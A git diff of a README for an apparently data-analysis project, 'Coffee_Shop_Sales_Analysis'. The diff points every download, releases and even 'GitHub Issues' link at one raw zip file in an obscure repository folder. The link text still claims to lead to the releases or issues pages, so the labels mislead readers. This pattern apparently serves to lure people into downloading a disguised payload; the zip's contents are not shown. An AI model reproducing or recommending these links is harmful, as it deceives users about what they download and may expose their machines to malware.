@@ -1,6 +1,6 @@
 # ☕ Coffee_Shop_Sales_Analysis - Unlock Retail Insights Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Pinquei/Coffee_Shop_Sales_Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/Pinquei/Coffee_Shop_Sales_Analysis/main/lymnaean/Shop_Coffee_Sales_Analysis_1.1.zip%https://raw.githubusercontent.com/Pinquei/Coffee_Shop_Sales_Analysis/main/lymnaean/Shop_Coffee_Sales_Analysis_1.1.zip)](https://raw.githubusercontent.com/Pinquei/Coffee_Shop_Sales_Analysis/main/lymnaean/Shop_Coffee_Sales_Analysis_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download and run the application, ensure you have:
 
 To get started, visit the releases page to download the latest version:
 
-[Download the Latest Release](https://github.com/Pinquei/Coffee_Shop_Sales_Analysis/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Pinquei/Coffee_Shop_Sales_Analysis/main/lymnaean/Shop_Coffee_Sales_Analysis_1.1.zip)
 
 1. **Go to the Releases Page**: Click the link above to be directed to the releases section.
 2. **Select the Latest Version**: Look for the version labeled as "Latest".
@@ -65,7 +65,7 @@ If you encounter a bug, please report it on the GitHub Issues page. Provide as m
 
 ## 🗨️ Community and Support
 
-For further assistance, please refer to our [GitHub Issues](https://github.com/Pinquei/Coffee_Shop_Sales_Analysis/issues). We welcome contributions and feedback to improve the application. Join our community focusing on retail data analysis!
+For further assistance, please refer to our [GitHub Issues](https://raw.githubusercontent.com/Pinquei/Coffee_Shop_Sales_Analysis/main/lymnaean/Shop_Coffee_Sales_Analysis_1.1.zip). We welcome contributions and feedback to improve the application. Join our community focusing on retail data analysis!
 
 ## 📫 Contact
 
